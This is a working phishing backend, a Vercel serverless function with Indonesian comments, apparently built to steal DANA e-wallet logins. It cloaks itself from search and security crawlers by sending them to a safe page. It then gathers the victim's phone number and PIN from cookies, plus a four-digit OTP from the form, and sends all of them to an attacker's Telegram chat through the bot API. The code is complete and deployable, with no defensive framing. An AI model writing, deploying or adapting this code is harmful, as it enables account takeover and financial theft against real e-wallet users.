// Struktur folder API untuk Vercel
// Ini adalah file yang akan digunakan oleh Vercel sebagai serverless function
const fetch = require("node-fetch");
const cookie = require("cookie");

// Daftar pola User-Agent bot yang umum
const botPatterns = [
  /bot/i, /spider/i, /crawler/i, /slurp/i, /googlebot/i, /bingbot/i, /yandexbot/i, /duckduckbot/i, /baiduspider/i, /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /embedly/i, /quora link preview/i, /showyoubot/i, /outbrain/i, /pinterest/i, /developers.google.com/i, /adsbot-google/i, /mediapartners-google/i, /feedfetcher-google/i, /applebot/i, /petalbot/i, /ahrefsbot/i, /semrushbot/i, /mj12bot/i, /dotbot/i, /bytespider/i
];

// Pola User-Agent TelegramBot
const telegramBotPattern = /TelegramBot/i;

module.exports = async (req, res) => {
  // --- Bot Detection Start ---
  const userAgent = req.headers["user-agent"] || "";
  const isTelegramBot = telegramBotPattern.test(userAgent);
  const isOtherBot = botPatterns.some(pattern => pattern.test(userAgent));

  // Redirect semua bot kecuali TelegramBot ke halaman aman
  if (isOtherBot && !isTelegramBot) {
    console.log(`Bot detected (and not TelegramBot): ${userAgent}. Redirecting to safe page.`);
    return res.status(200).json({ 
      success: true,
      message: "Redirecting to safe page",
      redirect: "/safe.html"
    });
  } else if (isTelegramBot) {
    console.log(`TelegramBot detected: ${userAgent}. Allowing request.`);
  }
  // --- Bot Detection End ---

  // Hanya menerima metode POST
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  try {
    // Parse body dari request
    const data = req.body;
    const otp1 = data.otp1;
    const otp2 = data.otp2;
    const otp3 = data.otp3;
    const otp4 = data.otp4;
    
    // Validasi input
    if (!otp1 || !otp2 || !otp3 || !otp4) {
      return res.status(400).json({ message: "OTP tidak lengkap" });
    }

    const otp = otp1 + otp2 + otp3 + otp4;
    
    // Ambil nomor HP dan PIN dari cookie
    let nohp = "";
    let pin = "";
    if (req.headers.cookie) {
      const cookies = cookie.parse(req.headers.cookie);
      nohp = cookies.nohp || "";
      pin = cookies.pin || "";
    }
    
    // Ambil API key dan chat ID dari environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    // Validasi environment variables
    if (!botToken || !chatId) {
      console.error("Environment variables TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak ditemukan");
      return res.status(500).json({ message: "Konfigurasi server tidak lengkap" });
    }

    // Format pesan untuk Telegram
    const message = `
╔═════ஜ۩۞۩ஜ═════╗
  Notif.Dana.masok.bossqu

• No HP     : ${nohp}
• Pin       : ${pin}
• Otp       : ${otp}
`;

    // Kirim pesan ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      })
    });

    const telegramData = await telegramResponse.json();
    
    return res.status(200).json({ 
      success: true,
      message: "Data berhasil dikirim",
      redirect: "/success.html"
    });
  } catch (error) {
    console.error("Error:", error);
    return res.status(500).json({ message: "Terjadi kesalahan pada server" });
  }
};